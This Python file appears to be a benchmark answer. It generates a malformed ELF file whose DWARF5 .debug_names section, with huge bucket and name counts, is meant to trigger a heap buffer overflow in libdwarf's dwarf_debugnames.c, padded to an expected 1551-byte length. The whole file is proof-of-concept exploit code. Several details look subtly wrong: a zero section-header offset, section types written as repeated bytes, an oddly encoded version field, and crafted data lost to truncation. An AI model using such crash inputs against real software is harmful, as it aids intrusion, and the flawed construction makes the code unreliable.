import os
import struct
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ELF with malformed DWARF5 .debug_names section
        # that triggers the heap buffer overflow in dwarf_debugnames.c
        
        # Build a minimal ELF64 structure
        elf = bytearray()
        
        # ELF header (64-bit)
        elf += b'\x7fELF'  # Magic
        elf += b'\x02'     # 64-bit
        elf += b'\x01'     # Little endian
        elf += b'\x01'     # ELF version
        elf += b'\x00'     # OS ABI
        elf += b'\x00'     # ABI version
        elf += b'\x00' * 7 # Padding
        elf += b'\x02\x00' # ET_EXEC
        elf += b'\x3e\x00' # x86-64
        elf += b'\x01\x00' # ELF version
        elf += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Entry point
        elf += b'\x40\x00\x00\x00\x00\x00\x00\x00' # Phdr offset
        elf += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Shdr offset
        elf += b'\x00\x00\x00\x00' # Flags
        elf += b'\x40\x00' # ELF header size
        elf += b'\x38\x00' # Phdr entry size
        elf += b'\x01\x00' # Phdr count
        elf += b'\x40\x00' # Shdr entry size
        elf += b'\x02\x00' # Shdr count
        elf += b'\x01\x00' # Shdr string index
        
        # Program header (loadable segment)
        elf += b'\x01\x00\x00\x00' # PT_LOAD
        elf += b'\x05\x00\x00\x00' # Read + Execute
        elf += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Offset
        elf += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Virtual address
        elf += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Physical address
        elf += b'\x00\x02\x00\x00\x00\x00\x00\x00' # File size
        elf += b'\x00\x02\x00\x00\x00\x00\x00\x00' # Mem size
        elf += b'\x00\x10\x00\x00\x00\x00\x00\x00' # Alignment
        
        # Fill with zeros to reach section headers
        elf += b'\x00' * (0x200 - len(elf))
        
        # Section header string table
        shstrtab = b'\x00.shstrtab\x00.debug_names\x00'
        shstrtab_offset = 0x200
        elf.extend(shstrtab)
        elf += b'\x00' * (0x300 - len(elf))
        
        # .debug_names section (vulnerable section)
        # DWARF5 .debug_names header with miscalculated limits
        debug_names = bytearray()
        
        # Unit length (makes total section 0x100 bytes)
        debug_names += struct.pack('<I', 0xF0)  # Length without this field
        debug_names += b'\x00\x00\x00\x05'      # DWARF version 5
        debug_names += b'\x00\x00'              # Padding
        
        # Debug names header fields
        debug_names += struct.pack('<I', 0)     # comp_unit_count
        debug_names += struct.pack('<I', 0)     # local_type_unit_count
        debug_names += struct.pack('<I', 0)     # foreign_type_unit_count
        debug_names += struct.pack('<I', 0xFFFFFFFF)  # bucket_count (large value)
        debug_names += struct.pack('<I', 0xFFFFFFFF)  # name_count (large value)
        debug_names += struct.pack('<I', 0)     # abbrev_table_size
        debug_names += struct.pack('<I', 0)     # augmentation_string_size
        
        # Bucket array - intentionally malformed to cause overflow
        # The vulnerability: internal calculations don't properly check
        # that bucket_count * 4 doesn't overflow 32-bit when added to offsets
        for i in range(256):  # Large enough to trigger overflow
            debug_names += struct.pack('<I', 0xFFFFFFFF)
        
        # Name table - minimal content
        debug_names += b'\x00' * 0x10
        
        # Hash array - minimal content  
        debug_names += b'\x00' * 0x10
        
        # Ensure total debug_names size is 0x100
        debug_names = debug_names[:0xF4]
        debug_names += b'\x00' * (0xF4 - len(debug_names))
        
        debug_names_offset = 0x300
        elf.extend(debug_names)
        
        # Section headers
        elf_offset = len(elf)
        
        # Null section header
        elf += b'\x00' * 0x40
        
        # .debug_names section header
        elf += struct.pack('<I', 11)  # sh_name (offset in shstrtab to ".debug_names")
        elf += b'\x01' * 4           # SHT_PROGBITS
        elf += b'\x00' * 8           # Flags
        elf += b'\x00' * 8           # Address
        elf += struct.pack('<Q', debug_names_offset)  # Offset
        elf += struct.pack('<Q', len(debug_names))    # Size
        elf += b'\x00' * 4           # Link
        elf += b'\x00' * 4           # Info
        elf += b'\x00' * 8           # Alignment
        elf += b'\x00' * 8           # Entry size
        
        # .shstrtab section header
        elf += struct.pack('<I', 1)   # sh_name (offset in shstrtab to ".shstrtab")
        elf += b'\x03' * 4           # SHT_STRTAB
        elf += b'\x00' * 8           # Flags
        elf += b'\x00' * 8           # Address
        elf += struct.pack('<Q', shstrtab_offset)  # Offset
        elf += struct.pack('<Q', len(shstrtab))    # Size
        elf += b'\x00' * 4           # Link
        elf += b'\x00' * 4           # Info
        elf += b'\x00' * 8           # Alignment
        elf += b'\x00' * 8           # Entry size
        
        # Pad to exact ground-truth length of 1551 bytes
        current_len = len(elf)
        if current_len < 1551:
            elf += b'A' * (1551 - current_len)
        elif current_len > 1551:
            elf = elf[:1551]
        
        return bytes(elf)
